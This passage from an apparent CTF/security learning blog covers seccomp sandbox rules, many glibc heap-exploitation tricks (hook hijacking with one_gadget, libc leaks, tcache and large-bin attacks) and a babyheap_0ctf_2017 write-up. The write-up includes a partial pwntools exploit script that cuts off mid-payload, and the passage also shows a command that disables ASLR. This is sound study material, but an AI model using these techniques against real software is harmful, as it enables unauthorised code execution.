<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><span class="image-caption">img</span></a></strong></p>
<p>从上图可以看出，当prctl的第一个参数设置为38时，第二个参数设置为1时，变会触发上述效果。</p>
<h3 id="PR-SET-SECCOMP（用22表示）"><a href="#PR-SET-SECCOMP（用22表示）" class="headerlink" title="PR_SET_SECCOMP（用22表示）"></a>PR_SET_SECCOMP（用22表示）</h3><p>第二个参数，可以参见man手册里面的介绍</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><span class="image-caption">img</span></a></strong></p>
<p>设置 seccomp ，其实也就是设置沙箱规则，这个 option 有两个子参数：</p>
<ul>
<li><p>这里如果设置了 <code>SECCOMP_MODE_STRICT</code> （用1表示）模式的话，系统调用只能使用 read, write,_exit 这三个。</p>
</li>
<li><p>如果设置了 <code>SECCOMP_MODE_FILTER</code> （用2表示）的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了。</p>
<p>首先介绍一下这个BPF是啥吧，度娘上面的解释是：</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><span class="image-caption">img</span></a></strong></p>
</li>
</ul>
<p>看解释感觉是网络数据包传输过滤的一种规则，但事实上，后面已经被引用为沙箱规则</p>
<blockquote>
<p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p>
</blockquote>
<p>总结一些点：</p>
<ol>
<li><p><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP ，两个宏展开都是已经赋值的了struct bpf_insn结构。</p>
</li>
<li><p><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</p>
</li>
<li><p><strong>BPF 条件判断跳转指令</strong>：BPF_JMP、BPF_JEQ，BPF_JA,BPF_JGT等，语法跟汇编语言几乎相等，根据后面的几个参数进行判断，然后跳转到相应的地方。</p>
</li>
<li><p><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</p>
</li>
<li><p><strong>一些杂用指令</strong>：BPF_H表示按字传输，BPF_W表示按双字传输，BPF_B表示按单个字节传输；BPF_ABS表示绝对偏移，BPF_IND表示相对偏移， <code>SECCOMP_RET_ALLOW</code> 表示允许， <code>SECCOMP_RET_ERRNO</code> 表示禁止。</p>
<p>这个其实背后也牵涉到很多内容，参见以下两篇文章的介绍。</p>
<p><a href="http://www.360doc.com/content/06/1026/17/13362_241408.shtml">http://www.360doc.com/content/06/1026/17/13362_241408.shtml</a></p>
</li>
</ol>
<p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>以上设置在pwn题中遇到时一般都是禁止了一些系统调用。故可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用。</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
]]></content>
      <tags>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>堆二三事</title>
    <url>/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="一些关于堆的小知识点"><a href="#一些关于堆的小知识点" class="headerlink" title="一些关于堆的小知识点"></a>一些关于堆的小知识点</h1><p>（没有顺序，知识点是零散的，都是我自己学到一点，记录下一点）</p>
<p>1、当small chunk只有一个时，如果被释放了，会被划分到unsorted bin里面，如果只有一个时，该chunk的fd和bk都指向libc中的地址，可以借此泄露libc地址</p>
<p>如果程序没开PIE，可以试着考虑下泄露got表来获得libc地址</p>
<p>在高版本利用中可以借着large bin上存留libc地址进行泄露</p>
<p>2、当先调用了mmap函数时，malloc系列函数申请的chunk的地址是从heap的起始地址开始分配的，又有页（4KB）是内存分配的最小单位，导致heap地址的最低三位总是0x000。因此申请的chunk可以只要覆盖地址最低两位进行修改其fd和bk的值</p>
<p>3、在利用malloc_hook（__malloc_hook是一个弱类型的函数指针变量，指向void * function(size_t size void * caller)，当调用malloc系列函数时，会判断hook指针是否为空，不为空则调用它）函数时，要使用错位偏移，即为把<strong>hook函数地址-0x23（有时候也可以找找hook地址-0x20+0x5）</strong>。此时，在写上p8(0)*3+p64(one_gadget)即可获取shell（似乎有些不准确，虽然有的确实行的通，但是更全面的应该是检验的size位置是int类型的函数，所以我们应该查看低32位的数，所以不局限-0x20，可能是0x30，0x38等等，在gdb里面调试发现即可）</p>
<p>4、如果释放两个fast chunk进入fast bin中，如果有UAF漏洞，修改后进的堆块fd指针指向其他的同样大小的fast chunk，那么被指向的堆块会被认为是在fast bin中的，而这时候如果这个chunk的fd上有地址数据，就可以申请到那边去（适用于要借用unsorted chunk上的脏数据，覆盖低字节地址）</p>
<p>5、chunk的size字段的最末位的三个比特位被用作状态标识，所以，size字段的以16进制表示时，最后一位16进制数是不能算到size里面的</p>
<p>6、一个chunk的大小最小是0x20(32字节64位系统下)，或者0x10(16字节32位系统下)</p>
<p>7、在Glibc2.26之后的版本出现了Tcache机制，在64位情况下，tcache优先于其他bin链接收释放掉的0×20<del>0×410大小的堆块（32位下0xC</del>0x200），tcache最多可以接收7个chunk，多出的部分将按照原来Glibc版本里面的方式分配。</p>
<p>并且从tcache分配出去的chunk并不会检查被分配位置的size大小，也就是不必像之前的版本使用错位偏移来使size符合检查</p>
<p>利用Tcache泄露libc有以下几种方法：</p>
<ul>
<li>申请8个大堆块，释放8个，这里堆块大小，大于fastbin范围，就是填满tcache，让第八个进入unsorted bin中</li>
<li>有UAF的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围</li>
<li>申请大堆块，大于0×400</li>
<li>修改堆上的Tcache管理结构，把count值改为7（count的值是有规律的，在Tcache里面，第一个字节存放的是0x20大小的堆块个数，每隔一个字节，堆块大小增加0x10，前0x40都是存放个数，后面的内容存放堆块地址），然后再次free一个该大小的chunk，注意防止chunk被top chunk合并</li>
</ul>
<p>以上都可以让chunk的fd和bk指针指向libc中的地址而泄露地址</p>
<p>8、当修改hook函数为one_gadget发现所有给的execve都不行时，这时需要我们借用__libc_realloc去调整栈的参数，使execve的环境被满足才可以利用成功。__realloc_hook的地址是__malloc_hook-0x8。因为调用realloc会执行许多的push指令，可以把rsp调整到满足环境。要查看push操作，可以把__libc_realloc地址加上n，指向的都是push指令</p>
<p>操作：把one_gadget写到__realloc_hook地址上，因为在使用malloc函数后面会调用到__relloc_hook；在__malloc_hook地址写上__libc_realloc+n(就会先执行__libc_realloc+n调整，再执行one_gadget)</p>
<p>注：根据libc版本问题，不一定都是__libc_realloc ，也可以是 realloc</p>
<p>9、堆题libc都很重要,题目没给libc，如果存在double free，可以用其测试libc版本</p>
<ul>
<li>如果报fastbin double free 那就是2.23~2.26<ul>
<li>2.23下会检查free的fastbin chunk是不是fastbin链表中的第一个chunk</li>
</ul>
</li>
<li>如果没报错那就是2.27~2.28<ul>
<li>因为有tcahce，2.27的tcache没有任何检查</li>
</ul>
</li>
<li>如果报tcache double free那么就是2.29及其以上<ul>
<li>因为2.29以后tcache增加了key字段防止tcache double free</li>
</ul>
</li>
</ul>
<p>10、chunk的三个标志位：从高到低依次表示为：non_main_arena、is_mmap、prev_inuse</p>
<p>non_main_arena：0表示当前chunk是属于main_arena，1表示不属于</p>
<p>is_mmap：1表示当前chunk是使用mmap申请的，0表示不是</p>
<p>prev_inuse：1表示前一个chunk在被用户使用，0表示前一个chunk被释放</p>
<p>11、如果申请的chunk大小为0x60和0x68返回的是一样大小的chunk，而0x68多出的8个字节是使用了后一个chunk的presize</p>
<p>12、大小属于fastbinchunk被free的时候，不会改变next chunk的prev_inuse</p>
<p>13、想要让chunk进入small bins 或者large bins：</p>
<p>一、释放的chunk大小先达到 small bins 或者 large bins 的大小范围。该chunk先进入到 unsorted bin，然后再申请一次堆块，申请的大小大于之前释放的chunk，那么之前释放的chunk就会进入到 small bins 或者 large bins</p>
<p>二、释放的 chunk 大小先达到small bins 或者 large bins 的大小范围。该 chunk 进入到 unsorted bin 中，如果此时 unsorted bin 中存在其他的堆块，那么申请一个堆块（能够让其他堆块满足分配的）剩余的堆块就将会自动进入到相应的 bin 链中</p>
<p>14、如果从unsortedbin中分配出chunk，是从大chunk的头部开始分配的，分配完申请的大小之后把大chunk剩下的继续留在unsortedbin中</p>
<p>15、unsortedbin中的chunk重新分配出来时，里面的数据不会被系统清空（如果程序没动的话），所以里面还是存在着libc地址</p>
<p>16、修改free_hook内容为system地址，然后free一个chunk，chunk内容为”/bin/sh”，就相当于执行了system(“/bin/sh”)，这种方法稳定getshell</p>
<p>17、在libc版本2.23及以下的时候，使用one_gadget稳定getshell，可以使用条件为[rsp+0x50] == NULL的one_gadget，然后对同一个chunk进行double free（指针没有置0）即可getshell</p>
<p>18、当把malloc_hook劫持为one_gadget失败时，除了可以去调整栈之外，还可以换思路去劫持free_hook，就是16中的办法，或者是劫持realloc（在malloc_hook-0x8的地方），往realloc_hook中写入one_gadget,malloc_hook中写入realloc函数的地址</p>
<p>19、因为free_hook前面一大段内容不存在像malloc_hook一样的0x7f的信息，所以要寻找的可以分配的堆头可能要往前找很大的偏移</p>
<ul>
<li>在2.23版本中可以使用unsortedbin attack（修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10），在那边写入unsortedbin地址，从而拥有了0x7f（使用过之后如果fastbin里面没有chunk，那么申请堆块会到unsortedbin里面去找，找的话就会报错，此时需要到main_arena对应地址去修复unsortedbin的指针，改回原来的样子）</li>
<li>劫持top chunk，生成一个fastchunk释放掉，接着把fd指针修改为fastchunk的大小（如写入0x81），然后再把刚才释放的堆块申请出来，此时会在main_arena生成出一个0x81，可以通过fastchunk的检查，而在这个下方，就是top chunk的指针，把指针内容修改到目标地址前面的地址（地址需要符合top size），然后再申请堆块即可（此时不可以存在被释放的堆块，要让堆块是从top chunk中分配的）</li>
</ul>
<p>20、绕过calloc的清空数据：把堆的is_mmap位置改为1，calloc将不会清空属于mmap的堆块数据</p>
<p>顺序：释放==&gt;修改堆头==&gt;申请堆块</p>
<p>并且 calloc 函数不会分配 tcache bin 中的堆块，可以利用该函数直接绕过 tcache</p>
<p>21、<code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去，然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存</p>
<p>22、当堆题中没有show功能时，要泄露出libc地址，需要借助stdout吐出libc地址</p>
<p>需要把 _IO_2_1_stdout 上的值修改为<code>p64(0xfbad1800) + p64(0) * 3 + &#39;\x00&#39;</code></p>
<p>23、当分配unsorted chunk时，如果剩下的块仍然大于0x80，并且还是唯一的，那这个新的unsorted chunkfd，bk指针仍然指向libc地址，并且分配出去的堆块，如果没有对堆块进行清零，那么上面将会存放着之前unsorted chunk的fd、bk指针</p>
<p>24、libc-2.23.so时的fd，bk指针，指向的是堆块的prev_size位置，libc-2.27.so时的fd，bk指针指向的是堆块的内容（就是存放fd，bk指针的位置）比libc-2.23.so多了0x10</p>
<p>25、利用<code>exit_hook</code>：劫持<code>_dl_rtld_lock_recursive</code>的值为one_gadget，当调用exit函数时可得到shell</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903170451297.png"><span class="image-caption">image-20210903170451297</span></p>
<p>寻找<code>exit_hook：</code></p>
<p>​        在gdb中输入<code>p _rtld_global</code>，可以找到这两个被赋予的值。</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220721110209483.png"><span class="image-caption">image-20220721110209483</span></p>
<p>然后在输入 <code>search &quot;0x7ff75581d150&quot; -t qword</code>即可找到其对应的地址。</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220721110328165.png"><span class="image-caption">image-20220721110328165</span></p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p>libc-2.27.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x619F60</li>
<li>rtld_unlock = libc_base + 0x619F68</li>
</ul>
<p>注：上述只是2.23，2.27的libc版本，但是同2.23，2.27的libc其实还有小版本类型，但是不变的是都在<code>_rtld_global+3840</code>的地址</p>
<p>适用范围 glibc-2.23~glibc-2.34ubuntu3，直到 glibc-2.34ubuntu3.2 地址不可写了，才正式宣告失效。</p>
<p>26、libc-2.27.so的unlink要先把tcache bin填满才能用，unlink要保证<code>unsorted bin是空的</code>，所以有时候泄露信息用了unsorted bin，要申请回来</p>
<p>27、当我们申请一个大于 top chunk 的堆块时，程序会调用 mmap 进行内存分配，分配下来堆块的地址是libc中的地址</p>
<p>28、libc-2.27堆的orw：利用setcontext+53的指令，把setcontext+53的地址一般写在__free_hook上，而shellcode写在堆上，然后进行释放堆块从而执行orw</p>
<p>29、当劫持堆块到 tcache，释放 tcache 获得 libc 地址后， 由于 unsorted bin 的 fd 和 bk 会在 tcache struct 写一些数据，而这些数据会覆盖到 tcache struct 上的 counts，导致取出相应的 size 时发生错误，所以需要修复 tcache，将<strong>不必要的数据清为 0，有需要伪造并取出的部分赋值为 1</strong>（因为从 glibc-2.31 开始，不允许tcache的count小于0）</p>
<p>30、如果把 malloc_hook 劫持为 system 也是可以的，后面在调用malloc时传入参数，不传入size大小，而是变为 /bin/sh 的地址即可</p>
<p>31、realloc 函数原型：<code>extern void *realloc(void *mem_address, unsigned int newsize);</code></p>
<ul>
<li>mem_address 不变，newsize == 0，相当于释放原来的堆块；</li>
<li>mem_address == 0 &amp;&amp; newsize &gt; 0，相当于malloc；</li>
<li>mem_address 不变，newsize &gt; originsize，如果与topchunk相邻则直接扩展到newsize，不相邻则<code>先释放原堆块</code>，然后再malloc一个更大的堆块，原堆块内容会被拷贝过去；返回新堆块的地址</li>
<li>mem_address 不变，newsize &lt;= originsize，如果切割后剩下的堆块大于 2 * chunk_min_size则切割，剩下堆块被free，否则直接返回原堆块</li>
</ul>
<p>32、在利用 offbynull 构造 overlap，遇到过多次：头尾两个要释放的堆块之间不能只间隔一个堆块，至少要两个才行，不然将无法成功利用 offbynull</p>
<p>33、unsorted bin 泄露出的 main_arena + 96 的 libc 地址和 __malloc_hook 的地址只相差一个字节的数据，所以如果拥有能在释放堆块修改的数据的权利时，可以修改 main_arena + 96 后一字节即可，可以避免要打印 libc 地址</p>
<p>34、large bin attack 利用：</p>
<ul>
<li><p>修改 TLS 中保存的 tcache 的地址，将其劫持为可控地址，等同于把 tcache bin 申请出来，可以直接进行任意地址分配。但是缺点是 TLS 可能存在第四、五位地址处出现偏差，需要爆破（但是是个定值。）</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20230201225501974.png"><span class="image-caption">image-20230201225501974</span></p>
</li>
<li><p><strong>TCACHE_MAX_BINS</strong> 是 tcache bin 链的最大数量，宏定义为<strong>64</strong>，可以修改其值为 chunk 的地址，那么所有 chunk 块 free 之后都会进入tcache，位置如下图所示。（glibc-2.30后才可以适用）</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220304094405889.png"><span class="image-caption">image-20220304094405889</span></p>
</li>
<li><p>global_max_fast记录着 fast bin 的最大 size，改大之后，可以让更大的size也算入 fast bin ，然后可以依据 main_arena 就算的偏移，把堆地址写入到 fast bin 之后的任一地址上，位置如下图所示。</p>
</li>
</ul>
<p>​                    <img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220310192041331.png"><span class="image-caption">image-20220310192041331</span></p>
<ul>
<li>FSOP的利用，2.31及以上的主要用法。</li>
</ul>
<p>35、小技巧：在使用 one_gadget 时，可以先用 0xcafebabedeadbeef 填充，然后直接 c 就会让程序 down 在调用的位置，可以直接查看寄存器的值。</p>
<p>36、临时关闭 ASLR 随机化，重启失效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>

<p>37、glibc-2.34及以上开始删除 hook 后，寻求以 IO 中的函数调用作为替代品：</p>
<ol>
<li>house of kiwi 中劫持 _IO_file_jumps + 0x60 的 __IO_file_sync（高版本的 _IO_file_jumps  可写，但是也存在最新的小版本不可写的情况）</li>
<li>house of emma</li>
<li>house of apple</li>
</ol>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>堆入门题</title>
    <url>/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="纪念"><a href="#纪念" class="headerlink" title="纪念"></a>纪念</h1><p>第一次学习堆，特意为这题单发一个博客好了。作为接触堆的一个分界线吧！</p>
<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210410075150.png"></p>
<p>照例checksec以及运行，发现开启了全部的缓解机制。进入ida静态分析，了解一下具体运行情况。审计一下其中的代码</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212529.png"></p>
<p>在main函数里面，可以看到分为了众多函数，首先v4是一个指针，其次他的值来自于sub_B70，我们要进入这个函数查看一番，返回了什么地址，并赋值给了v4</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212357.png"></p>
<p>在sub_B70这个函数中，调用了mmap函数，开辟了一段匿名映射区。该映射区起始地址为addr，长度为0x1000，权限为可写可执行，用于<strong>存放最多16个结构体。每个结构体包含in_use、size和buf_ptr三个域，分别表示堆块是否在被使用、堆的大小和指向堆块缓冲区的指针。</strong> 而函数sub_B70便是把这个匿名映射的地址返回给了v4。</p>
<p>接下来两个函数，一个是用来输出选项的字符串，一个是用来输入的，输入长度被限制为8个字节，就不细讲了。以及注意后面执行的四个函数，都是把v4指向的地址作为参数进入到函数中去。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428230535.png" style="zoom:80%;">

<p>这是1.Allocate函数的代码，首先是在之前mmap申请的16个结构体中找到一个未被使用过的结构体，然后再要我们输入一个数，生成该数数值大小的一个堆，不能超过0x1000。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231105.png" style="zoom:80%;">

<p>这是2.Fill函数。首先读取一个数作为索引，并判断该对应的结构体是否被使用了。如果被使用了，则读取第二个数作为size，并且调用函数sub_11B2，把对应的结构体的buf_ptr指针和size作为参数。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231148.png" style="zoom:80%;">

<p>进入到sub_11B2函数中，可以很明显的得知，我们可以向Fill函数中的结构体buf_ptr指针指向的堆输入size个字符，不过只能输入一次。这里的read函数，对size大小并没限制，造成明显的溢出点，后面可以利用</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231209.png" style="zoom:80%;">

<p>这是3.Free函数。首先读取一个数作为索引，并找到索引对应的结构体，如果该结构体被使用了，就把该结构体指向的堆释放了，同时把in_use、size和buf_ptr全部清零。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231232.png" style="zoom:80%;">

<p>最后一个dump函数。首先读取一个数作为索引，找到对应的结构体，如果被使用则调用函数sub_130F，把该结构体的buf_ptr和size两个域作为参数传入。这个函数就不再多介绍，与Fill中的函数类似，仅仅是把read换成了write，把堆的内容写到标准输出。</p>
<p>代码到此就审计完了，回顾整个代码，可以发现，在calloc申请堆的长度是不大于4096的，而在Fill中的read读取长度很明显可以大于4096，而造成堆溢出，这就是本题的漏洞点，之后的思考在于怎么利用这个堆溢出。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418155849.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162040.png"></p>
<p>首先，我们先创建五个chunk，四个是fast chunk，还有一个为small chunk。fast chunk通过fastbin来重叠chunk，small chunk用来获取libc_base。我们把chunk1和chunk2释放掉，根据fastbin后进先出的机制，我们只要再次申请同等大小的chunk，即可把原本释放掉的chunk“归还”回来。因为后面要通过chunk4获取libc偏移，所以我们要在chunk4上面重叠chunk2造成拥有两个指针都可以访问chunk4的地址，才能在把chunk4释放掉之后，仍然可以读取其值。所以接下来要把chunk2的fd的值改为指向chunk4即可。</p>
<p>因为刚开始申请空间时，调用了mmap，那么就可以保证chunk是从堆的起始地址开始分配的，也就是后三位是0x000开始的。那我们修改fd只需要把其修改其最后两位为0x80就可以。因为fast bin的大小有限制，所以还要一起把chunk4的size大小改为21。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162937.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163044.png"></p>
<p>这是把chunk4释放掉之后，可以看见其fd和bk都指向同一个地址，而这个地址是处于libc里面的地址，所以可以通过这个算出相对于libc起始地址的偏差，因为开启了pie保护，所以libc起始地址是会改变的，但是偏移却是一定的。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163308.png"></p>
<p>计算可知，偏移为0x3c4b78。偏移到手了，代表着one_gadget的绝对地址也已经有了，接下来就是找到个可以执行程序的东西，对ong_gadget执行即可获取shell。这里我们使用劫持__malloc_hook函数，这个函数是一个弱类型的函数指针，指向void *function(size_t size,void *caller)。当调用malloc函数的时候，会先判断hook函数指针是否为空，如果不为空，就调用它。所以我们要把hook函数指针修改为one_gadget的地址，进行调用one_gadget</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418170734.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418171155.png"></p>
<p>第二行就是我们需要覆盖的值，所以，我们要在他的前面创建chunk，然后堆溢出覆盖到目标地址。但是前面的数值过于巨大，fast bin的大小不过才0x20~0x80而已，所以这里要利用一个小技巧：错位偏移。即是不要对准内存，而这内存进行偏移0xd个位置，把开头的7f移动到末位，从而能申请到fast chunk。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175210.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175119.png"></p>
<p>而在这里申请chunk跟之前差不多，先把之前释放的chunk4申请回来，作为fast chunk，我是申请了0x60的大小。然后再释放掉，归到fast bin去，然后通过2来修改其fd的值，去指向malloc_hook附近的地址，然后申请两次同样大小的chunk，第二个chunk就会在我们想要的地址。这里的偏移输入，因为先在hook的位置上移0x20-0xd处建chunk，那么前0x10用来标记，后面的才是存放数据，也就是我们输入数据的起始位置距离hook函数指针的偏移为0x10-0xd=0x3，相差3个字节，所以我们要用p(8)*3先填充这个偏差，然后才是真正的hook函数指针地址，再写入one_gadget的地址即可。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25412</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.recvline()<br>	<span class="hljs-keyword">return</span> p.recvline() <span class="hljs-comment">#接收堆中内容</span><br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk0</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk2</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk3</span><br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>payload=<span 